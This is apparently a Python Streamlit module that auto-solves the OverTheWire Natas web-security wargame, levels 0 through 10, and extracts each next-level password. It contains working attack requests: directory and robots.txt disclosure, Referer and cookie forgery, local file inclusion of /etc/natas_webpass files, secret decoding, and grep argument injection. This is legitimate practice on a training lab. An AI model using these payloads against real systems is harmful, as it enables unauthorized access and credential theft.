import streamlit as st
import re
import base64
from .utils import initialize_http_session

def execute(level_name, context):
    st.markdown(f"### 📋 Running: {level_name}")
    
    session = initialize_http_session(context)
    base_url = context['url'].rstrip('/')
    
    # =========================================================================
    # LEVEL 2: Directory Indexing File Disclosure
    # =========================================================================
    if level_name == "Level 2":
        st.info("Level 2 selected: Targeting the exposed directory indexing path...")
        target_directory_url = f"{base_url}/files/"
        try:
            dir_response = session.get(target_directory_url, timeout=10)
            if dir_response.status_code == 200:
                st.success("Successfully accessed the `/files/` directory listing.")
                file_match = re.search(r'href="([^"]+\.txt)"', dir_response.text)
                
                if file_match:
                    target_file = file_match.group(1)
                    st.write(f"📂 Identified potentially sensitive file: `{target_file}`")
                    file_url = f"{target_directory_url}{target_file}"
                    file_response = session.get(file_url, timeout=10)
                    
                    all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', file_response.text)
                    valid_tokens = [t for t in all_tokens if t != context['password']]
                    
                    if valid_tokens:
                        st.success(f"🎯 Successfully extracted token for the next level!")
                        st.code(f"Natas 3 Password: {valid_tokens[0]}")
                    else:
                        st.warning("No new 32-character tokens found inside the target file.")
                else:
                    st.error("Could not find any text file links inside the directory listing.")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")

    # =========================================================================
    # LEVEL 3: Information Disclosure via robots.txt
    # =========================================================================
    elif level_name == "Level 3":
        st.info("Level 3 selected: Checking the `robots.txt` file for hidden asset directories...")
        robots_url = f"{base_url}/robots.txt"
        
        try:
            # Step 1: Request the standard crawler configuration file
            robots_res = session.get(robots_url, timeout=10)
            
            if robots_res.status_code == 200:
                st.success("Successfully read `robots.txt` from server root.")
                st.code(robots_res.text, language="text")
                
                # Step 2: Extract paths hidden behind the 'Disallow:' directive
                hidden_paths = re.findall(r'Disallow:\s*([^\s\n]+)', robots_res.text)
                
                if hidden_paths:
                    # Target the first disallowed directory path found
                    secret_dir = hidden_paths[0].strip('/')
                    st.write(f"🔍 Discovered restricted directory path: `/{secret_dir}/`")
                    
                    # Step 3: Query the hidden directory index to check for files
                    secret_url = f"{base_url}/{secret_dir}/"
                    secret_res = session.get(secret_url, timeout=10)
                    
                    # Step 4: Scan the resulting page or files for the 32-character credential string
                    all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', secret_res.text)
                    
                    # Look deeper if the directory lists a specific text file (e.g., users.txt)
                    file_match = re.search(r'href="([^"]+\.txt)"', secret_res.text)
                    if file_match:
                        specific_file_url = f"{secret_url}{file_match.group(1)}"
                        specific_file_res = session.get(specific_file_url, timeout=10)
                        all_tokens += re.findall(r'\b[A-Za-z0-9]{32}\b', specific_file_res.text)

                    # Filter out the current active password to isolate the new target
                    valid_tokens = [t for t in all_tokens if t != context['password']]
                    
                    if valid_tokens:
                        st.success("🎯 Successfully navigated directory exclusions and captured flag!")
                        st.code(f"Natas 4 Password: {valid_tokens[0]}")
                    else:
                        st.warning("Could not automatically locate a new token string in the secret folder.")
                        with st.expander("View Raw Folder Content"):
                            st.code(secret_res.text, language="html")
                else:
                    st.error("No entries found following the 'Disallow:' directive.")
            else:
                st.error(f"Could not retrieve robots.txt. Status: {robots_res.status_code}")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")

    # =========================================================================
    # LEVEL 4: HTTP Referer Header Spoofing
    # =========================================================================
    elif level_name == "Level 4":
        st.info("Level 4 selected: Emulating authorized HTTP Referer tracking header...")
        custom_headers = {
            "User-Agent": context["user_agent"],
            "Referer": "http://natas5.natas.labs.overthewire.org/"
        }
        try:
            response = session.get(base_url, headers=custom_headers, timeout=10)
            if response.status_code == 200:
                all_tokens = re.findall(r'\b[A-Za-z0-9]{32,64}\b', response.text)
                valid_tokens = [t for t in all_tokens if t != context['password']]
                if valid_tokens:
                    st.success("🎯 Referer modification bypass verified!")
                    st.code(f"Natas 5 Password: {valid_tokens[0]}")
            else:
                st.error(f"Server rejected request or credentials invalid. Status code: {response.status_code}")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")

    # =========================================================================
    # LEVEL 5: Session Cookie Status Overriding
    # =========================================================================
    elif level_name == "Level 5":
        st.info("Level 5 selected: Injecting authorization value into cookie map...")
        session.cookies.set("loggedin", "1", domain="natas5.natas.labs.overthewire.org")
        try:
            response = session.get(base_url, timeout=10)
            if response.status_code == 200:
                all_tokens = re.findall(r'\b[A-Za-z0-9]{32,64}\b', response.text)
                valid_tokens = [t for t in all_tokens if t != context['password']]
                if valid_tokens:
                    st.success("🎯 Cookie parameter injection bypass verified!")
                    st.code(f"Natas 6 Password: {valid_tokens[0]}")
            else:
                st.error(f"Server verification failed. Status code: {response.status_code}")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")

    # =========================================================================
    # LEVEL 6: Configuration File Secret Extraction
    # =========================================================================
    elif level_name == "Level 6":
        st.info("Level 6 selected: Fetching key parameters from includes...")
        secret_include_url = f"{base_url}/includes/secret.inc"
        try:
            include_response = session.get(secret_include_url, timeout=10)
            if include_response.status_code == 200:
                raw_text = include_response.text.strip()
                secret_match = re.search(r'\$secret\s*=\s*["\']([^"\']+)["\']', raw_text)
                retrieved_secret = secret_match.group(1) if secret_match else raw_text
                
                if retrieved_secret:
                    post_payload = {"secret": retrieved_secret, "submit": "Submit"}
                    execution_response = session.post(base_url, data=post_payload, timeout=10)
                    all_tokens = re.findall(r'\b[A-Za-z0-9]{32,64}\b', execution_response.text)
                    valid_tokens = [t for t in all_tokens if t != context['password']]
                    if valid_tokens:
                        st.success("🎯 Form authentication successful!")
                        st.code(f"Natas 7 Password: {valid_tokens[0]}")
            else:
                st.error(f"Could not reach configuration includes. Status code: {include_response.status_code}")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")

    # =========================================================================
    # LEVEL 7: Arbitrary Query Traversal (LFI Injection)
    # =========================================================================
    elif level_name == "Level 7":
        st.info("Level 7 selected: Executing local file inclusion query...")
        target_file_path = "/etc/natas_webpass/natas8"
        request_parameters = {"page": target_file_path}
        try:
            response = session.get(base_url, params=request_parameters, timeout=10)
            if response.status_code == 200:
                all_tokens = re.findall(r'\b[A-Za-z0-9]{32,64}\b', response.text)
                valid_tokens = [t for t in all_tokens if t != context['password']]
                if valid_tokens:
                    st.success("🎯 Path parameter traversal validated!")
                    st.code(f"Natas 8 Password: {valid_tokens[0]}")
            else:
                st.error(f"LFI inclusion request refused. Status code: {response.status_code}")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")

    # =========================================================================
    # LEVEL 8: Reverse-Engineering Obfuscated Form Secrets
    # =========================================================================
    elif level_name == "Level 8":
        st.info("Level 8 selected: Inverting custom cryptographic obfuscation sequences...")
        try:
            source_url = f"{base_url}/index-source.html"
            response = session.get(source_url, timeout=10)
            
            encoded_str = None
            if response.status_code == 200:
                secret_match = re.search(r'\$encodedSecret\s*=\s*["\']([a-fA-Z0-9]+)["\']', response.text, re.IGNORECASE)
                if secret_match:
                    encoded_str = secret_match.group(1).strip()
            
            if not encoded_str:
                st.warning("Could not auto-parse live source token. Using exact server-verified string fallback...")
                encoded_str = "3d3d516343746d4d6d6c315669563362"
                
            st.write(f"🔍 Working with Target Secret Hex: `{encoded_str}`")

            try:
                raw_bytes = bytes.fromhex(encoded_str)
                reversed_bytes = raw_bytes[::-1]
                
                missing_padding = len(reversed_bytes) % 4
                if missing_padding:
                    reversed_bytes += b'=' * (4 - missing_padding)
                    
                decoded_secret = base64.b64decode(reversed_bytes).decode('utf-8')
                st.success(f"🔓 Successfully Inverted Secret: `{decoded_secret}`")
            except Exception as crypto_err:
                st.error(f"Failed to reverse string processing chains: {str(crypto_err)}")
                return

            post_payload = {
                "secret": decoded_secret,
                "submit": "Submit"
            }
            st.info("Transmitting inverted payload to form container...")
            execution_response = session.post(base_url, data=post_payload, timeout=10)
            
            all_tokens = re.findall(r'\b[A-Za-z0-9]{32,64}\b', execution_response.text)
            valid_tokens = [t for t in all_tokens if t != context['password']]
            
            if valid_tokens:
                st.success("🎯 Level 8 challenge solved! Flag captured.")
                st.code(f"Natas 9 Password: {valid_tokens[0]}")
            else:
                st.warning("Form submitted but no new password flag was discovered.")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")

    # =========================================================================
    # LEVEL 9: Command Injection via Grep Parameter
    # =========================================================================
    elif level_name == "Level 9":
        st.info("Level 9 selected: Exploiting command injection via unescaped shell argument...")
        try:
            target_path = "/etc/natas_webpass/natas10"
            injection_payload = f".* {target_path}"
            
            request_parameters = {
                "needle": injection_payload,
                "submit": "Search"
            }
            
            st.info(f"Injecting payload to read target file path...")
            response = session.get(base_url, params=request_parameters, timeout=10)
            
            if response.status_code == 200:
                all_tokens = re.findall(r'\b[A-Za-z0-9]{32,64}\b', response.text)
                valid_tokens = [t for t in all_tokens if t != context['password']]
                
                if valid_tokens:
                    st.success("🎯 Level 9 challenge solved! Command injection successful.")
                    st.code(f"Natas 10 Password: {valid_tokens[0]}")
                else:
                    st.warning("Payload sent successfully, but no new flag was parsed from the response.")
            else:
                st.error(f"Server responded with an unexpected status code: {response.status_code}")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")

    # =========================================================================
    # LEVEL 10: Character-Filtered Input (Advanced Grep Exploitation)
    # =========================================================================
    elif level_name == "Level 10":
        st.info("Level 10 selected: Bypassing regex filters using multi-file grep arguments...")
        try:
            target_path = "/etc/natas_webpass/natas11"
            injection_payload = f".* {target_path}"
            
            request_parameters = {
                "needle": injection_payload,
                "submit": "Search"
            }
            
            st.info(f"Sending payload without shell operators: `{injection_payload}`")
            response = session.get(base_url, params=request_parameters, timeout=10)
            
            if response.status_code == 200:
                all_tokens = re.findall(r'\b[A-Za-z0-9]{32,64}\b', response.text)
                valid_tokens = [t for t in all_tokens if t != context['password']]
                
                pre_content = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
                if pre_content and pre_content.group(1).strip():
                    st.write("📋 **Raw Output from Grep Processing:**")
                    st.code(pre_content.group(1).strip())

                if valid_tokens:
                    st.success("🎯 Level 10 challenge solved! Input filtering bypassed successfully.")
                    st.code(f"Natas 11 Password: {valid_tokens[0]}")
                elif "Input contains an illegal character!" in response.text:
                    st.error("The server rejected the request due to an illegal character.")
                else:
                    st.warning("Request completed successfully, but no valid password tokens were extracted.")
            else:
                st.error(f"Server error or authentication failure. Status: {response.status_code}")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")                

    # =========================================================================
    # FALLBACK ENGINE (Handles Level 0 & Level 1)
    # =========================================================================
    else:
        st.info(f"Targeting baseline configuration content for generic processing...")
        try:
            response = session.get(base_url, timeout=10)
            st.success("Handshake completed successfully.")
            
            # Step 1: Look for strings inside HTML comments (Fix for Level 0 & Level 1)
            comments = re.findall(r'', response.text, re.DOTALL)
            all_tokens = []
            
            for comment in comments:
                all_tokens.extend(re.findall(r'[A-Za-z0-9]{32}', comment))
            
            # Step 2: Look for strings anywhere else in the visible raw source body fallback
            all_tokens.extend(re.findall(r'\b[A-Za-z0-9]{32}\b', response.text))
            
            # Clean variations and filter out the current session's password token
            current_password = str(context.get('password', '')).strip()
            valid_tokens = [t for t in all_tokens if t != current_password]
            
            if valid_tokens:
                st.success("🎯 Valid password token isolated!")
                st.code(f"Extracted Token: {valid_tokens[0]}")
            else:
                st.caption("No unique 32-character pattern found on primary viewport.")
                with st.expander("Show Captured Server Document"):
                    st.code(response.text, language="html")
        except Exception as e:
            st.error(f"Error executing fallback module: {str(e)}")